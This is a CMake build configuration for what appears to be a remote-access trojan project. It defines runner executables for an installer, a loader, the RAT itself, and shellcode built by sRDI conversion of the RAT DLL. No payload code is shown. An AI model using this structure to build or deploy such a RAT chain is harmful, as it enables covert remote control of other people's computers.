###############################################################################
# Installer runner
###############################################################################
add_executable(installer-runner "installer-runner.cpp")
target_link_libraries(installer-runner PRIVATE installer)

# Copy dependencies into target binary directory.
add_custom_command(
    TARGET installer-runner POST_BUILD
    COMMAND ${CMAKE_COMMAND} -E copy -t $<TARGET_FILE_DIR:installer-runner> $<TARGET_RUNTIME_DLLS:installer-runner>
    COMMAND_EXPAND_LISTS
)

###############################################################################
# Loader runner
###############################################################################
add_executable(loader-runner "loader-runner.cpp")
target_link_libraries(loader-runner PRIVATE loader)
target_link_options(loader-runner PRIVATE /guard:cf)

# Copy dependencies into target binary directory.
add_custom_command(
    TARGET loader-runner POST_BUILD
    COMMAND ${CMAKE_COMMAND} -E copy -t $<TARGET_FILE_DIR:loader-runner> $<TARGET_RUNTIME_DLLS:loader-runner>
    COMMAND_EXPAND_LISTS
)

###############################################################################
# RAT runner
###############################################################################
add_executable(rat-runner "rat-runner.cpp")
target_link_libraries(rat-runner PRIVATE rat)

# Copy dependencies into target binary directory.
add_custom_command(
    TARGET rat-runner POST_BUILD
    COMMAND ${CMAKE_COMMAND} -E copy -t $<TARGET_FILE_DIR:rat-runner> $<TARGET_RUNTIME_DLLS:rat-runner>
    COMMAND_EXPAND_LISTS
)

add_executable(
    rat-shellcode-runner
    "rat-shellcode-runner.cpp"
    "rat-shellcode.hpp"
    "rat-shellcode.rc"
) 

add_dependencies(rat-shellcode-runner rat-srdi)

target_compile_definitions(
    rat-shellcode-runner
    PRIVATE SHELLCODE_PATH="$<TARGET_FILE:rat>.srdi"
)

###############################################################################
# Shellcode runner
###############################################################################
add_executable(shellcode-runner "shellcode-runner.cpp")
target_link_libraries(shellcode-runner PRIVATE shellcode phnt::headers ${RAT_HOST_DLL}.lib ws2_32.lib advapi32.dll winsta.lib)
target_link_options(shellcode-runner PRIVATE /INCLUDE:${RAT_HOST_DLL_EXPORT} /INCLUDE:freeaddrinfo /INCLUDE:RegCloseKey)
target_include_directories(shellcode-runner PRIVATE ${CMAKE_SOURCE_DIR}/include)

target_compile_definitions(
    shellcode-runner
    PRIVATE SHELLCODE_PATH="$<TARGET_PROPERTY:shellcode,SOURCES>"
)

add_dependencies(shellcode-runner shellcode)

